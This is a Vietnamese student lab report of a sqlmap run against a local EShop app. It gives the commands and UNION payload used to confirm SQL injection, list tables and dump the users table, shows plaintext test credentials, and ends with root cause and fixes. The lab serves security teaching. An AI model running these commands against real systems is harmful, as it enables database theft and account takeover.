# Lab 2 — Kết quả chạy thật sqlmap (17/10/2026)

**Người chạy:** Phát 23120317. **Target:** `http://localhost:3000/api/products?search=phone` (backend EShop localhost). **sqlmap:** 1.10.10.

## Lệnh đã chạy & kết quả

### 1. Xác nhận injectable
```
sqlmap -u "http://localhost:3000/api/products?search=phone" --batch
```
→ `GET parameter 'search' is vulnerable` · **Type: UNION query (6 columns)** · **back-end DBMS: SQLite** · web tech: Express.
Payload: `search=phone' UNION ALL SELECT CONCAT(...),NULL,NULL,NULL,NULL,NULL-- -`

### 2. Liệt kê bảng
```
sqlmap -u "http://localhost:3000/api/products?search=phone" --batch --tables
```
→ DB (tên sqlmap đặt): **`SQLite_masterdb`** · 7 bảng: `categories, coupon_usage, coupons, orders, products, sqlite_sequence, users`.

### 3. Dump bảng users
> `--dump` không tự enumerate được cột trên SQLite → chỉ định cột trực tiếp bằng `-C`.
```
sqlmap -u "http://localhost:3000/api/products?search=phone" --batch -T users -C "name,email,password,role" --dump
```
→ Kết quả (xem `sqlmap_users_dump.csv`):

| name | role | email | password |
|---|---|---|---|
| Admin User | admin | admin@eshop.com | Admin123! |
| Test User | user | test@eshop.com | Test1234! |

## Nhận xét cho báo cáo
- **Root cause:** `server.js:144` nối chuỗi `... WHERE name LIKE '%${searchQuery}%'` → cho phép UNION injection.
- **Impact:** lộ toàn bộ bảng users; **mật khẩu lưu plaintext** (không hash) → rò rỉ trực tiếp credential, kể cả tài khoản admin.
- **Khắc phục:** parameterized query / prepared statement; hash mật khẩu (bcrypt); least-privilege DB.

## Lưu ý kỹ thuật (điểm sửa so với bản lab cũ)
- SQLite qua sqlmap hiển thị DB là **`SQLite_masterdb`** (tên placeholder của sqlmap), **không phải** `main`. → **không dùng `-D main`**; bỏ hẳn `-D` là được.
- `-D main` chỉ đúng khi truy cập trực tiếp bằng công cụ sqlite (engine-level), không áp dụng cho sqlmap.
- `--dump` cần `-C "..."` vì sqlmap không enumerate được cột users trên SQLite trong lần chạy này.

## File minh chứng
- `sqlmap_users_dump.csv` — bản dump CSV sqlmap xuất ra.
- Output đầy đủ của sqlmap: `C:\Users\HP\AppData\Local\sqlmap\output\localhost\`.
